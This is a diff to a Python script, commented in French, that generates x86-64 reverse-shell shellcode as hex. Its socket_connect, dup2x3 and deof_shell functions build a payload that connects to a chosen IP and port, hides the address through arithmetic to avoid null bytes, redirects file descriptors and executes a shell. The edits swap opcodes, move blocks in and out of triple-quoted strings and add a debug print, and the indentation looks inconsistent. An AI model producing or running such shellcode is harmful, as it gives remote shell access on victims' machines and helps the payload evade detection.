@@ -17,7 +17,7 @@ def verifOffus(binBashHexa):
         numInHex = int(sub,16)
 
         #Vérifie qu'il n'y ait ni de 0 ni de valeur à 16
-        if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
+        if numInHex == int("0xff",16) :
             return False
     return True
 
@@ -301,7 +301,7 @@ def socket_connect(ip, port):
    ip_greater = []
    ip_to_substract = []
    cmp = 0
-
+   '''
    #Génère une IP supérieur à l'IP en argument
    for ip in ip.split("."):
         ip_to_substract.append(r(int(ip)+1, 255))
@@ -312,16 +312,40 @@ def socket_connect(ip, port):
 
    #Passage en hexa de l'IP supérieur
    for i in range(0,len(ip_greater)):
-       if ip_greater[i] < 17: PAYLOAD += "0"
-       PAYLOAD += hex(ip_greater[i])[2:]
-
-   add_string += "83ee"            #   sub esi, 0xIPinferior
+    tmp = hex(ip_greater[i])
+    if len(tmp) == 3:
+        PAYLOAD+="0"+str(tmp[-1:])
+    elif len(tmp) == 4:
+        PAYLOAD+=str(tmp[-2:]) 
+        
+   add_string += "81ee"            #   sub esi, 0xIPinferior
    
    #Génère en hexa de l'IP inférieur 
    for i in range(0, len(ip_to_substract)):
-        if ip_to_substract[i] < 17: PAYLOAD += "0"
+        if ip_to_substract[i] < 17 : PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[2:]
+    '''
+    #BACKUP
+   #Génère une IP supérieur à l'IP en argument
+   for ip in ip.split("."):
+        ip_to_substract.append(r(int(ip)+1, 255))
+        ip_greater.append(ip_to_substract[cmp] - int(ip))
+        cmp += 1
+    
+   add_string += "be"               #   mov esi, 0xIPgreater
 
+   #Passage en hexa de l'IP supérieur
+   for i in range(0,len(ip_greater)):
+       if ip_greater[i] < 17: 
+        PAYLOAD += "0"
+       PAYLOAD += hex(ip_greater[i])[2:]
+
+   add_string += "81ee"            #   sub esi, 0xIPinferior
+   
+   #Génère en hexa de l'IP inférieur 
+   for i in range(0, len(ip_to_substract)):
+        if ip_to_substract[i] < 17 : PAYLOAD += "0"
+        PAYLOAD += hex(ip_to_substract[i])[2:]
    #Met le port en hexa 
    port = hex(socket.htons(int(port)))
 
@@ -380,8 +404,9 @@ def deof_socket_connect(ip, port):
 
 def dup2x3():
     global PAYLOAD
-    PAYLOAD += clean('rax')
     for i in range(0,2):
+        PAYLOAD += clean('rax')
+        PAYLOAD += clean('rdx')
         PAYLOAD += "b033"
         PAYLOAD += "4c89d7"
         if i == 0:
@@ -389,6 +414,7 @@ def dup2x3():
         else:
             PAYLOAD += '48ffc6' # inc rsi
         PAYLOAD += call()
+        print("DEBUG: ",PAYLOAD)
 
 
 
@@ -478,12 +504,11 @@ def deof_shell():
     PAYLOAD+="50" #push rax
     PAYLOAD+="57" #push rdi
     PAYLOAD+="4889e6" #mov rsi, rsp
-  
     #Appel systeme
     PAYLOAD+="b03b" #mov al, 0x3b
-    PAYLOAD+= call()
-"""    
+    PAYLOAD+= call()   
     
+"""
 def _exit():
     global PAYLOAD
     PAYLOAD+=clean("rax")
